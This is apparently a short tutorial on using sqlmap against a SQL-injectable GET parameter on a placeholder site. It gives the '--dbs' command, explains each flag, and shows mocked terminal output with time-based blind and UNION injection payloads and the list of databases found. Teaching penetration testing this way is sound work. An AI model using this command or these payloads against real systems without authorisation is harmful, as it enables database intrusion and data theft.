# SQLmap Examples

## Scenario: Exploiting SQL Injection in a GET Parameter

You found a web application with a URL structure like `http://example.com/product.php?id=5`. You suspect the `id` parameter is vulnerable to SQL injection and want to dump the database names.

### Command

```bash
sqlmap -u "http://example.com/product.php?id=5" --dbs --batch
```

### Explanation of Flags
* `-u "..."`: Specifies the target URL.
* `--dbs`: Instructs SQLmap to enumerate the databases on the target server.
* `--batch`: Never ask for user input, use the default behavior automatically.

### Mocked Terminal Output

```text
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7.3#stable}
|_ -| . ["]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:45:00 /2024-05-31/

[11:45:00] [INFO] testing connection to the target URL
[11:45:01] [INFO] checking if the target is protected by some kind of WAF/IPS
[11:45:01] [INFO] testing if the target URL content is stable
[11:45:01] [INFO] target URL content is stable
[11:45:01] [INFO] testing if GET parameter 'id' is dynamic
[11:45:01] [INFO] GET parameter 'id' appears to be dynamic
[11:45:02] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[11:45:02] [INFO] testing for SQL injection on GET parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
[11:45:02] [INFO] GET parameter 'id' is 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[11:45:02] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 42 HTTP(s) requests:
---
Parameter: id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=5 AND (SELECT 6251 FROM (SELECT(SLEEP(5)))aXyB)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=5 UNION ALL SELECT NULL,CONCAT(0x7162786a71,0x5a544b635678444c4b69,0x7171787a71),NULL-- -
---
[11:45:03] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.41, PHP 7.4.3
back-end DBMS: MySQL >= 5.0.12
[11:45:03] [INFO] fetching database names
available databases [3]:
[*] information_schema
[*] webapp_db
[*] test

[11:45:03] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/example.com'

[*] ending @ 11:45:03 /2024-05-31/
```
